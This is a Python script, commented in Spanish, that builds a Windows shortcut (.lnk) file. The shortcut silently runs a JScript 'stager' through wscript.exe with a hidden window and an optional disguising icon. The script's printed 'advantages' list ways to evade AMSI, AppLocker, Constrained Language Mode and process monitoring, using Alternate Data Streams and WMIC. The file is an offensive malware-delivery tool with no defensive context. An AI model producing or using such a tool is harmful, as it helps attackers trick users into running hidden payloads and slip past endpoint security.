#!/usr/bin/env python3
"""
Crear .lnk que ejecuta JScript stager
"""

import os
import sys
from pathlib import Path

try:
    import win32com.client
except ImportError:
    print("[❌] Instalar: pip install pywin32")
    sys.exit(1)

def create_js_lnk(js_path, output_lnk, icon_path=None):
    """Crear .lnk que ejecuta JScript con wscript"""
    
    js_path = str(Path(js_path).absolute())
    output_lnk = str(Path(output_lnk).absolute())
    working_dir = str(Path(js_path).parent)
    js_filename = Path(js_path).name
    
    print(f"[🔗] Creando acceso directo para JScript...")
    print(f"    JS: {js_filename}")
    print(f"    LNK: {output_lnk}")
    
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(output_lnk)
    
    # Target: wscript.exe (motor nativo de JScript)
    shortcut.TargetPath = r"C:\Windows\System32\wscript.exe"
    
    # Arguments: usar solo el nombre del archivo (ruta relativa al working dir)
    shortcut.Arguments = f'//B //Nologo "{js_filename}"'
    
    # Working directory: donde está el JS (CRÍTICO para ruta relativa)
    shortcut.WorkingDirectory = working_dir
    
    # Ventana oculta
    shortcut.WindowStyle = 7
    
    # Icono
    if icon_path and os.path.exists(icon_path):
        shortcut.IconLocation = f"{os.path.abspath(icon_path)},0"
        print(f"    Icono: {icon_path}")
    
    shortcut.Save()
    
    print(f"[✅] LNK creado exitosamente")
    print(f"\n[💡] Ventajas de JScript:")
    print(f"   ✅ AMSI no escanea JScript por defecto")
    print(f"   ✅ No bloqueado por AppLocker (scripts no firmados)")
    print(f"   ✅ CLM (Constrained Language Mode) no aplica")
    print(f"   ✅ jscript.dll es nativo y confiable")
    print(f"   ✅ Alternate Data Streams (ADS) para evasión")
    print(f"   ✅ WMIC para ejecución sin procesos hijos")

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Crear .lnk para JScript stager')
    parser.add_argument('--js', required=True, help='Ruta al stager .js')
    parser.add_argument('--output', required=True, help='Nombre del .lnk de salida')
    parser.add_argument('--icon', help='Ruta al icono .ico')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.js):
        print(f"[❌] No se encuentra: {args.js}")
        sys.exit(1)
    
    create_js_lnk(args.js, args.output, args.icon)
